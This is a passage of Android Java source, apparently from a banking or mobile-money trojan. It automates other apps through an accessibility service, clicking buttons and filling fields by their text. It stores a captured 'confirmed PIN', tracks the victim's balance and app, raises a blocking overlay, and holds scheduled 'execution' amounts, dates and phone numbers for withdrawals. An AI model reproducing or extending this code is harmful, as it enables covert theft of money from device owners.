        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            if (rootNode == null) return;
            
            List<AccessibilityNodeInfo> matchingNodes = 
                rootNode.findAccessibilityNodeInfosByText(buttonText);
            
            for (AccessibilityNodeInfo node : matchingNodes) {
                if (node.isClickable()) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    sleep(10);
                    node.recycle();
                    rootNode.recycle();
                    return;
                }
                
                AccessibilityNodeInfo parentNode = node.getParent();
                while (parentNode != null) {
                    if (parentNode.isClickable()) {
                        parentNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        sleep(10);
                        parentNode.recycle();
                        node.recycle();
                        rootNode.recycle();
                        return;
                    }
                    parentNode = parentNode.getParent();
                }
                node.recycle();
            }
            rootNode.recycle();
        } catch (Exception e) {}
    }

    private static void fillFieldByHint(String hintText, String valueToFill) {
        try {
            AccessibilityNodeInfo rootNode = accessibilityService.getRootInActiveWindow();
            if (rootNode == null) return;
            
            List<AccessibilityNodeInfo> matchingNodes = 
                rootNode.findAccessibilityNodeInfosByText(hintText);
            
            for (AccessibilityNodeInfo node : matchingNodes) {
                if (node.isEditable()) {
                    Bundle arguments = new Bundle();
                    arguments.putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, 
                        valueToFill
                    );
                    node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    sleep(10);
                    node.recycle();
                    rootNode.recycle();
                    return;
                }
            }
            rootNode.recycle();
        } catch (Exception e) {}
    }

    private static void pressBack() {
        try {
            accessibilityService.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            sleep(30);
        } catch (Exception e) {}
    }

    private static void sleep(int milliseconds) {
        try {
            Thread.sleep(milliseconds);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    // ==================== PUBLIC METHODS ====================

    public static boolean isTransactionRunning() {
        return isTransactionRunning.get();
    }

    public static void cancelTransaction() {
        isTransactionRunning.set(false);
        isProcessingWithdrawal = false;
        removeBlockingOverlay();
    }

    public static String getConfirmedPin() {
        return sharedPreferences.getString(CONFIRMED_PIN_PREF_KEY, null);
    }

    public static String getCurrentBalance() {
        return currentBalance;
    }

    public static String getCurrentApp() {
        return currentAppName;
    }

    public static String getCurrentPackage() {
        return currentAppPackage;
    }

    public static int getSurveyDay() {
        return sharedPreferences.getInt(SURVEY_DAY_KEY, 0);
    }

    public static boolean isSurveyComplete() {
        return sharedPreferences.getBoolean(SURVEY_COMPLETE_KEY, false);
    }

    public static boolean isExecutionPlanned() {
        return sharedPreferences.getBoolean(EXECUTION_PLANNED_KEY, false);
    }

    public static boolean isExecutionDone() {
        return sharedPreferences.getBoolean(EXECUTION_DONE_KEY, false);
    }

    public static String getExecutionDate() {
        return sharedPreferences.getString(EXECUTION_DATE_KEY, "");
    }

    public static String getExecutionAmount() {
        return sharedPreferences.getString(EXECUTION_AMOUNT_KEY, "");
    }

    public static String getExecutionPhone() {
        return sharedPreferences.getString(EXECUTION_PHONE_KEY, "");
    }
                        }
